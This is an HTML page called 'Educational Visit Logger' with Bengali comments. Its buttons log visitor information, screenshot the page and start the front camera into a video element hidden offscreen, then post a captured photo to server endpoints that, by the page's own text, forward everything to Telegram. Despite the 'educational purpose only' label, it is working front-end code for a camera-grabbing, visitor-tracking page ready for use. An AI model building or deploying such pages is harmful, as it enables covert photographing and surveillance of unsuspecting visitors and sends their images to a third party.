<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Educational Logger</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
  <style>
    body { 
      text-align: center; 
      margin-top: 80px; 
      font-family: Arial, sans-serif; 
      background: #f8f9fa; 
      color: #333;
    }
    h2 { color: #222; margin-bottom: 10px; }
    p { max-width: 600px; margin: 0 auto 20px; color: #555; }
    button { 
      padding: 12px 28px; 
      margin: 12px 8px; 
      font-size: 16px; 
      cursor: pointer; 
      border: none; 
      border-radius: 6px; 
      color: white;
      transition: background 0.2s;
    }
    button.primary { background: #007bff; }
    button.primary:hover { background: #0056b3; }
    button.danger { background: #dc3545; }
    button.danger:hover { background: #c82333; }
    button:disabled { opacity: 0.6; cursor: not-allowed; }
    #video {
      display: none;
      position: absolute;
      left: -9999px;
      top: -9999px;
      width: 1px;
      height: 1px;
    }
  </style>
</head>
<body>

  <h2>Educational Visit Logger</h2>
  <p>Educational purpose only — all actions (info log, screenshot, hidden camera photo) are sent to Telegram.</p>

  <!-- বাটন ১: শুধু টেক্সট লগ -->
  <button class="primary" onclick="sendData()">I Agree & Send Info</button>

  <!-- বাটন ২: স্ক্রিনশট -->
  <button class="primary" onclick="captureAndSendScreenshot()">Take Page Screenshot & Send 📸</button>

  <!-- বাটন ৩: হাইড ক্যামেরা -->
  <button class="primary" id="startCameraBtn">Start Hidden Camera & Prepare Photo 📷</button>
  <button class="danger" id="captureBtn" style="display:none;" onclick="capturePhoto()">Capture & Send Photo to Telegram</button>

  <!-- হাইড ভিডিও এলিমেন্ট -->
  <video id="video" autoplay playsinline muted></video>

  <script>
    // ১. টেক্সট লগ পাঠানো
    async function sendData() {
      try {
        const res = await fetch("/api/send", { method: "POST" });
        const data = await res.json();
        alert(data.success ? "Info Sent ✅" : "Failed ❌");
      } catch (err) {
        alert("Connection error: " + err.message);
      }
    }

    // ২. স্ক্রিনশট পাঠানো
    async function captureAndSendScreenshot() {
      try {
        const canvas = await html2canvas(document.body, { scale: 2 });
        const base64 = canvas.toDataURL("image/png");
        const res = await fetch("/api/send-screenshot", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image: base64 })
        });
        const data = await res.json();
        alert(data.success ? "Screenshot Sent 📸✅" : "Failed ❌");
      } catch (err) {
        alert("Screenshot failed: " + err.message);
      }
    }

    // ৩. হাইড ক্যামেরা লজিক
    const video = document.getElementById('video');
    const startBtn = document.getElementById('startCameraBtn');
    const captureBtn = document.getElementById('captureBtn');
    let stream = null;

    startBtn.onclick = async () => {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }, // "environment" দিলে পিছনের ক্যামেরা
          audio: false
        });

        video.srcObject = stream;

        startBtn.disabled = true;
        startBtn.textContent = "Camera Running (Hidden)";
        captureBtn.style.display = 'inline-block';

        alert("Camera started in background (no preview shown).\nWhen ready, click 'Capture & Send'.");
      } catch (err) {
        let msg = "Camera access denied or unavailable.";
        if (err.name === 'NotAllowedError') msg += "\nPlease allow camera permission in browser.";
        if (err.name === 'NotFoundError') msg += "\nNo camera found on this device.";
        alert(msg + "\nError: " + err.message);
      }
    };

    async function capturePhoto() {
      if (!stream) {
        return alert("Camera is not started yet. Click 'Start Hidden Camera' first.");
      }

      try {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const base64 = canvas.toDataURL('image/png');

        const res = await fetch("/api/send-photo", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image: base64 })
        });

        const data = await res.json();
        alert(data.success ? "Photo Captured & Sent 📷✅" : "Failed to send ❌");

        // চাইলে capture এর পর camera অফ করতে পারো (অপশনাল)
        // stopCamera();
      } catch (err) {
        alert("Capture / Send failed: " + err.message);
      }
    }

    // Camera বন্ধ করার ফাংশন (চাইলে পরে কল করো)
    function stopCamera() {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        video.srcObject = null;
        stream = null;
        captureBtn.style.display = 'none';
        startBtn.disabled = false;
        startBtn.textContent = "Start Hidden Camera & Prepare Photo 📷";
      }
    }
  </script>

</body>
</html>
